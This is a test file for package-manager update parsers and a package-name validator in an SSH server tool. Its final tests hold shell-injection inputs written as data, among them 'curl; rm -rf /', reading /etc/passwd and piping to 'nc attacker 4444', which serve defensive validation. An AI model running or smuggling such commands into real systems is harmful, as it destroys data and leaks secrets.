import { describe, test, expect } from "bun:test";
import { aptParser } from "../../server/ssh/parsers/apt";
import { dnfParser } from "../../server/ssh/parsers/dnf";
import { yumParser } from "../../server/ssh/parsers/yum";
import { pacmanParser } from "../../server/ssh/parsers/pacman";
import { apkParser } from "../../server/ssh/parsers/apk";
import { flatpakParser } from "../../server/ssh/parsers/flatpak";
import { snapParser } from "../../server/ssh/parsers/snap";
import { validatePackageName } from "../../server/ssh/parsers/types";

describe("AptParser", () => {
  test("parse normal output", () => {
    const stdout =
      "curl/jammy-updates 7.81.0-1ubuntu1.18 amd64 [upgradable from: 7.81.0-1ubuntu1.16]\n" +
      "libcurl4/jammy-updates 7.81.0-1ubuntu1.18 amd64 [upgradable from: 7.81.0-1ubuntu1.16]\n";
    const updates = aptParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("curl");
    expect(updates[0].currentVersion).toBe("7.81.0-1ubuntu1.16");
    expect(updates[0].newVersion).toBe("7.81.0-1ubuntu1.18");
    expect(updates[0].architecture).toBe("amd64");
    expect(updates[0].repository).toBe("jammy-updates");
    expect(updates[0].pkgManager).toBe("apt");
  });

  test("parse security update", () => {
    const stdout =
      "openssl/jammy-security 3.0.2-0ubuntu1.18 amd64 [upgradable from: 3.0.2-0ubuntu1.16]\n";
    const updates = aptParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].isSecurity).toBe(true);
  });

  test("marks kept-back packages from simulation output", () => {
    const listStdout = [
      "curl/jammy-updates 7.81.0-1ubuntu1.18 amd64 [upgradable from: 7.81.0-1ubuntu1.16]",
      "libcamera-ipa/jammy-updates 1.0 amd64 [upgradable from: 0.9]",
    ].join("\n");
    const updates = aptParser.parseCheckOutput("", "", 0, {
      commandResults: [
        {
          command: "DEBIAN_FRONTEND=noninteractive apt list --upgradable 2>/dev/null | tail -n +2",
          stdout: listStdout,
          stderr: "",
          exitCode: 0,
        },
        {
          command: "DEBIAN_FRONTEND=noninteractive apt-get -s -o Debug::NoLocking=1 upgrade 2>&1",
          stdout: "Inst curl [7.81.0-1ubuntu1.16] (7.81.0-1ubuntu1.18 Ubuntu:22.04/jammy-updates [amd64])",
          stderr: "",
          exitCode: 0,
        },
      ],
    });

    expect(updates).toHaveLength(2);
    expect(updates.find((update) => update.packageName === "curl")?.isKeptBack).toBe(false);
    expect(updates.find((update) => update.packageName === "libcamera-ipa")?.isKeptBack).toBe(true);
  });

  test("parse empty output", () => {
    const updates = aptParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("parse malformed lines", () => {
    const stdout =
      "this is not a valid line\ncurl/repo 1.0 amd64 [upgradable from: 0.9]\n";
    const updates = aptParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].packageName).toBe("curl");
  });

  test("get commands", () => {
    const cmds = aptParser.getCheckCommands();
    expect(cmds).toHaveLength(3);
    expect(cmds[0]).toContain("apt-get");
    expect(cmds[0]).toContain("update");
    expect(cmds[2]).toContain("Debug::NoLocking=1");
  });

  test("upgrade commands", () => {
    expect(aptParser.getUpgradeAllCommand()).toContain("apt-get");
    expect(aptParser.getUpgradeAllCommand()).toContain("upgrade");
    expect(aptParser.getUpgradePackageCommand("curl")).toContain("curl");
  });

  test("upgrade command uses configured full-upgrade mode", () => {
    expect(
      aptParser.getUpgradeAllCommand({ defaultUpgradeMode: "full-upgrade" }),
    ).toContain("full-upgrade");
  });

  test("full upgrade command", () => {
    const cmd = aptParser.getFullUpgradeAllCommand();
    expect(cmd).not.toBeNull();
    expect(cmd).toContain("full-upgrade");
    expect(cmd).toContain("apt-get");
  });
});

describe("DnfParser", () => {
  test("parse normal output", () => {
    const stdout =
      "curl.x86_64                        7.76.1-26.el9_3.3        baseos\n" +
      "vim-common.x86_64                  9.0.2081-1.el9           appstream\n" +
      "EXIT:100\n";
    const updates = dnfParser.parseCheckOutput(stdout, "", 100);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("curl");
    expect(updates[0].architecture).toBe("x86_64");
    expect(updates[0].newVersion).toBe("7.76.1-26.el9_3.3");
    expect(updates[0].repository).toBe("baseos");
  });

  test("exit code 100 is success", () => {
    const stdout = "pkg.x86_64 1.0 repo\nEXIT:100\n";
    const updates = dnfParser.parseCheckOutput(stdout, "", 100);
    expect(updates).toHaveLength(1);
  });

  test("exit code 0 no updates", () => {
    const stdout = "EXIT:0\n";
    const updates = dnfParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(0);
  });

  test("skip metadata lines", () => {
    const stdout =
      "Last metadata expiration check: 0:45:32 ago\n" +
      "curl.x86_64 1.0 repo\n" +
      "EXIT:100\n";
    const updates = dnfParser.parseCheckOutput(stdout, "", 100);
    expect(updates).toHaveLength(1);
  });

  test("empty output", () => {
    const updates = dnfParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("full upgrade command", () => {
    const cmd = dnfParser.getFullUpgradeAllCommand();
    expect(cmd).not.toBeNull();
    expect(cmd).toContain("distro-sync");
  });

  test("uses configured upgrade defaults and refresh mode", () => {
    expect(
      dnfParser.getUpgradeAllCommand({ defaultUpgradeMode: "distro-sync" }),
    ).toContain("distro-sync");
    expect(
      dnfParser.getCheckCommands({ refreshMetadataOnCheck: true })[0],
    ).toContain("check-update --refresh --quiet");
  });

  test("keeps signing-key acceptance disabled by default", () => {
    expect(dnfParser.getCheckCommands()[0]).not.toContain(" -y check-update");
  });

  test("can opt into automatic signing-key acceptance during checks", () => {
    expect(
      dnfParser.getCheckCommands({ autoAcceptNewSigningKeysOnCheck: true })[0],
    ).toContain("dnf -y check-update --quiet");
  });

  test("ignores GPG import chatter before package output", () => {
    const stdout = [
      "Importing GPG key 0x51312F3F:",
      'Userid     : "GitLab B.V. (package repository signing key) <packages@gitlab.com>"',
      "Fingerprint: F640 3F65 44A3 8863 DAA0 B6E0 3F01 618A 5131 2F3F",
      "From       : https://packages.gitlab.com/gitlab/gitlab-ce/gpgkey",
      "Is this ok [y/N]: y",
      "",
      "gitlab-ce.x86_64 18.9.2-ce.0.el9 gitlab_gitlab-ce",
      "EXIT:100",
    ].join("\n");

    const updates = dnfParser.parseCheckOutput(stdout, "", 0);

    expect(updates).toHaveLength(1);
    expect(updates[0]).toMatchObject({
      packageName: "gitlab-ce",
      architecture: "x86_64",
      newVersion: "18.9.2-ce.0.el9",
      repository: "gitlab_gitlab-ce",
    });
  });
});

describe("YumParser", () => {
  test("inherits dnf parsing", () => {
    const stdout = "curl.x86_64 1.0 updates\nEXIT:100\n";
    const updates = yumParser.parseCheckOutput(stdout, "", 100);
    expect(updates).toHaveLength(1);
    expect(updates[0].pkgManager).toBe("yum");
  });

  test("yum commands", () => {
    expect(yumParser.getUpgradeAllCommand()).toContain("yum");
    expect(yumParser.getCheckCommands()[0]).toContain("yum");
  });

  test("can opt into automatic signing-key acceptance during checks", () => {
    expect(
      yumParser.getCheckCommands({ autoAcceptNewSigningKeysOnCheck: true })[0],
    ).toContain("yum -y check-update --quiet");
  });

  test("no full upgrade command", () => {
    expect(yumParser.getFullUpgradeAllCommand()).toBeNull();
  });
});

describe("PacmanParser", () => {
  test("parse normal output", () => {
    const stdout =
      "linux 6.7.4.arch1-1 -> 6.7.5.arch1-1\n" +
      "firefox 122.0-1 -> 122.0.1-1\n";
    const updates = pacmanParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("linux");
    expect(updates[0].currentVersion).toBe("6.7.4.arch1-1");
    expect(updates[0].newVersion).toBe("6.7.5.arch1-1");
  });

  test("empty output", () => {
    const updates = pacmanParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("commands", () => {
    const cmds = pacmanParser.getCheckCommands();
    expect(cmds).toHaveLength(2);
    expect(cmds[0]).toContain("pacman -Sy");
    expect(cmds[1]).toContain("pacman -Qu");
    expect(cmds[1]).toContain('if [ "$rc" -eq 1 ]');
  });

  test("can skip database refresh on checks", () => {
    const cmds = pacmanParser.getCheckCommands({ refreshDatabasesOnCheck: false });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]).toContain("pacman -Qu");
  });

  test("no full upgrade command", () => {
    expect(pacmanParser.getFullUpgradeAllCommand()).toBeNull();
  });
});

describe("ApkParser", () => {
  test("parse normal output", () => {
    const stdout =
      "musl-1.2.3-r4 x86_64 {musl} (MIT) [upgradable from: musl-1.2.3-r3]\n" +
      "busybox-1.35.0-r18 x86_64 {busybox} (GPL-2.0-only) [upgradable from: busybox-1.35.0-r17]\n";
    const updates = apkParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("musl");
    expect(updates[0].currentVersion).toBe("1.2.3-r3");
    expect(updates[0].newVersion).toBe("1.2.3-r4");
    expect(updates[0].architecture).toBe("x86_64");
    expect(updates[0].repository).toBe("musl");
    expect(updates[0].pkgManager).toBe("apk");
  });

  test("handles hyphenated package names", () => {
    const stdout =
      "ca-certificates-bundle-20240226-r0 x86_64 {ca-certificates} (MPL-2.0 AND MIT) [upgradable from: ca-certificates-bundle-20211220-r0]\n";
    const updates = apkParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].packageName).toBe("ca-certificates-bundle");
    expect(updates[0].currentVersion).toBe("20211220-r0");
    expect(updates[0].newVersion).toBe("20240226-r0");
  });

  test("parse empty output", () => {
    const updates = apkParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("ignores malformed lines", () => {
    const stdout =
      "this is not valid\n" +
      "musl-1.2.3-r4 x86_64 {musl} (MIT) [upgradable from: musl-1.2.3-r3]\n";
    const updates = apkParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].packageName).toBe("musl");
  });

  test("commands", () => {
    const cmds = apkParser.getCheckCommands();
    expect(cmds).toHaveLength(2);
    expect(cmds[0]).toContain("apk update");
    expect(cmds[1]).toContain("apk list -u");
    expect(apkParser.getUpgradeAllCommand()).toContain("apk upgrade");
    expect(apkParser.getUpgradePackageCommand("busybox")).toContain("apk upgrade busybox");
  });

  test("can skip index refresh on checks", () => {
    const cmds = apkParser.getCheckCommands({ refreshIndexesOnCheck: false });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]).toContain("apk list -u");
  });

  test("no full upgrade command", () => {
    expect(apkParser.getFullUpgradeAllCommand()).toBeNull();
  });
});

describe("FlatpakParser", () => {
  test("parse combined output with installed versions", () => {
    const stdout =
      "===INSTALLED===\n" +
      "org.mozilla.firefox\t121.0\n" +
      "org.gnome.Calculator\t45.0\n" +
      "===UPDATES===\n" +
      "Firefox\torg.mozilla.firefox\t122.0\tstable\tflathub\n" +
      "Calculator\torg.gnome.Calculator\t\tstable\tflathub\n";
    const updates = flatpakParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("org.mozilla.firefox");
    expect(updates[0].currentVersion).toBe("121.0");
    expect(updates[0].newVersion).toBe("122.0");
    expect(updates[1].packageName).toBe("org.gnome.Calculator");
    expect(updates[1].currentVersion).toBe("45.0");
    expect(updates[1].newVersion).toBeNull();
  });

  test("parse without markers (legacy fallback)", () => {
    const stdout = "Firefox\torg.mozilla.firefox\t122.0\tstable\tflathub\n";
    const updates = flatpakParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].packageName).toBe("org.mozilla.firefox");
    expect(updates[0].newVersion).toBe("122.0");
    expect(updates[0].currentVersion).toBeNull();
  });

  test("empty", () => {
    const updates = flatpakParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("can skip appstream refresh on checks", () => {
    const cmds = flatpakParser.getCheckCommands({ refreshAppstreamOnCheck: false });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]).toContain("flatpak remote-ls --updates");
  });

  test("no full upgrade command", () => {
    expect(flatpakParser.getFullUpgradeAllCommand()).toBeNull();
  });
});

describe("SnapParser", () => {
  test("parse combined output with installed versions", () => {
    const stdout =
      "===INSTALLED===\n" +
      "Name      Version   Rev    Tracking       Publisher   Notes\n" +
      "firefox   121.0     3500   latest/stable  mozilla     -\n" +
      "vlc       3.0.18    400    latest/stable  videolan    -\n" +
      "===UPDATES===\n" +
      "Name      Version   Rev   Publisher   Notes\n" +
      "firefox   122.0     123   mozilla     -\n" +
      "vlc       3.0.20    456   videolan    -\n";
    const updates = snapParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(2);
    expect(updates[0].packageName).toBe("firefox");
    expect(updates[0].currentVersion).toBe("121.0");
    expect(updates[0].newVersion).toBe("122.0");
    expect(updates[1].packageName).toBe("vlc");
    expect(updates[1].currentVersion).toBe("3.0.18");
    expect(updates[1].newVersion).toBe("3.0.20");
  });

  test("parse without markers (legacy fallback)", () => {
    const stdout =
      "Name      Version   Rev   Publisher   Notes\n" +
      "firefox   122.0     123   mozilla     -\n";
    const updates = snapParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(1);
    expect(updates[0].packageName).toBe("firefox");
    expect(updates[0].newVersion).toBe("122.0");
    expect(updates[0].currentVersion).toBeNull();
  });

  test("no updates message", () => {
    const stdout =
      "===INSTALLED===\n" +
      "Name      Version   Rev    Tracking       Publisher   Notes\n" +
      "firefox   121.0     3500   latest/stable  mozilla     -\n" +
      "===UPDATES===\n" +
      "All snaps up to date.\n";
    const updates = snapParser.parseCheckOutput(stdout, "", 0);
    expect(updates).toHaveLength(0);
  });

  test("empty", () => {
    const updates = snapParser.parseCheckOutput("", "", 0);
    expect(updates).toHaveLength(0);
  });

  test("no full upgrade command", () => {
    expect(snapParser.getFullUpgradeAllCommand()).toBeNull();
  });
});

describe("Package Name Validation", () => {
  test("valid package names pass", () => {
    expect(validatePackageName("curl")).toBe("curl");
    expect(validatePackageName("libcurl4")).toBe("libcurl4");
    expect(validatePackageName("vim-common.x86_64")).toBe("vim-common.x86_64");
    expect(validatePackageName("python3.11")).toBe("python3.11");
    expect(validatePackageName("gcc-c++")).toBe("gcc-c++");
    expect(validatePackageName("org.mozilla.firefox")).toBe("org.mozilla.firefox");
    expect(validatePackageName("lib:amd64")).toBe("lib:amd64");
    expect(validatePackageName("name~1.0")).toBe("name~1.0");
  });

  test("shell injection attempts are rejected", () => {
    expect(() => validatePackageName("curl; rm -rf /")).toThrow("Invalid package name");
    expect(() => validatePackageName("curl && cat /etc/passwd")).toThrow("Invalid package name");
    expect(() => validatePackageName("curl | nc attacker 4444")).toThrow("Invalid package name");
    expect(() => validatePackageName("$(whoami)")).toThrow("Invalid package name");
    expect(() => validatePackageName("`whoami`")).toThrow("Invalid package name");
    expect(() => validatePackageName("curl > /tmp/out")).toThrow("Invalid package name");
    expect(() => validatePackageName("curl\nnewline")).toThrow("Invalid package name");
    expect(() => validatePackageName("pkg name")).toThrow("Invalid package name");
  });

  test("empty and invalid names are rejected", () => {
    expect(() => validatePackageName("")).toThrow("Invalid package name");
    expect(() => validatePackageName(".hidden")).toThrow("Invalid package name");
    expect(() => validatePackageName("-flag")).toThrow("Invalid package name");
  });

  test("all parsers reject injection in getUpgradePackageCommand", () => {
    const malicious = "curl; rm -rf /";
    expect(() => aptParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => dnfParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => yumParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => pacmanParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => apkParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => flatpakParser.getUpgradePackageCommand(malicious)).toThrow();
    expect(() => snapParser.getUpgradePackageCommand(malicious)).toThrow();
  });
});
